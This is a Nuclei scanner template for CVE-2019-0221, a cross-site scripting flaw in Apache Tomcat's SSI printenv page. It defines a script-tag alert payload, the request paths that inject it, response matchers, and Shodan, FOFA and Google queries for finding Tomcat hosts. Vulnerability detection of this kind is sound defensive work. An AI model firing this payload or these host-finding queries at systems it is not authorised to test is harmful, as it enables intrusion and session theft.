http:
- matchers:
  - type: word
    words:
    - QUERY_STRING_UNESCAPED={{payload}}
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/printenv.shtml?{{url_encode(payload)}}'
  - '{{BaseURL}}/ssi/printenv.shtml?{{url_encode(payload)}}'
id: CVE-2019-0221
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-0221
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97367
    epss-score: 0.43363
  description: 'Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to
    7.0.93 are vulnerable to cross-site scripting because the SSI printenv command
    echoes user provided data without escaping. Note: SSI is disabled by default.
    The printenv command is intended for debugging and is unlikely to be present in
    a production website.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the victim''s browser, leading to session hijacking,
    defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query:
    - body="apache tomcat"
    - title="apache tomcat"
    google-query: intitle:"apache tomcat"
    max-request: 2
    product: tomcat
    shodan-query:
    - title:"Apache Tomcat"
    - http.title:"apache tomcat"
    - http.html:"apache tomcat"
    - cpe:"cpe:2.3:a:apache:tomcat"
    vendor: apache
  name: Apache Tomcat - Cross-Site Scripting
  reference:
  - https://seclists.org/fulldisclosure/2019/May/50
  - https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/
  - https://www.exploit-db.com/exploits/50119
  - https://lists.apache.org/thread.html/6e6e9eacf7b28fd63d249711e9d3ccd4e0a83f556e324aee37be5a8c@%3Cannounce.tomcat.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2019-0221
  remediation: 'Apply the necessary patches or updates provided by Apache Tomcat to
    fix the XSS vulnerability.

    '
  severity: medium
  tags: cve2019,cve,apache,xss,tomcat,seclists,edb,vuln
variables:
  payload: <script>alert({{rand_int()}})</script>
